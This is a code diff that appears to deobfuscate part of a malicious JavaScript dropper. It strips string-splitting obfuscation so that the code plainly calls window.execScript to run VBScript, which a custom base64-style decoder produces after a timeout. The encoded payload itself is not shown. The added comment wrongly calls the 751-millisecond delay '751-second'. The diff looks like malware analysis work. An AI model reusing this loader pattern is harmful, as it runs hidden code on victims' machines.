@@ -1,13 +1,8 @@
-/*s18157d39681hfj36688fs*/
-var fa = xcvsd45();
-/*s13529d75582hfj63990fs*/
-cvbcvb = "rip";
-/*s21976d16095hfj34714fs*/
-jkdfgd = "cr" + "ipt";
-
+/* Executes a VBS script after a 751-second timeout */
+/*s18157d39681hfj36688fs*/ /*s13529d75582hfj63990fs*/ /*s21976d16095hfj34714fs*/
 
 setTimeout(function () {
-    window["e" + "xe" + "cS" + jkdfgd](fa, "VBsc" + cvbcvb + "t");
+    window["execScript"](xcvsd45(), "VBscript");
 }, 751);
 
 /*s57253d71279hfj55961fs*/
@@ -19,10 +14,9 @@ function xcvsd45() {
     /*s27953d11246hfdffgj32131fs*/
     var e = {}, i, b = 0, c, x, aq = 0, a, r = "";
     L = s.length;
-    var rah = String, emu =/**/"fr" + "omCh" + "arCode", dfghj = rah[emu];
-    var ds = "repl";
+    var rah = String, emu =/**/"fromCharCode", dfghj = rah[emu];
     /*s92568d55988hfj3202fs*/
-    var A = "ABSD454FCDEFGHIJKSD454FLMNOPQRSTUVWXYSD454FZabcdefghijklmnopqrstuvwxyz0123456789+/"[ds + "ace"](/SD454F/g, "");
+    var A = "ABSD454FCDEFGHIJKSD454FLMNOPQRSTUVWXYSD454FZabcdefghijklmnopqrstuvwxyz0123456789+/"["replace"](/SD454F/g, "");
     ch = "WaTAtcharAt".substr(5);
     for (i = 0; i < 2 + 30 + 32; i++) {
         e[A[ch](i)] = i;
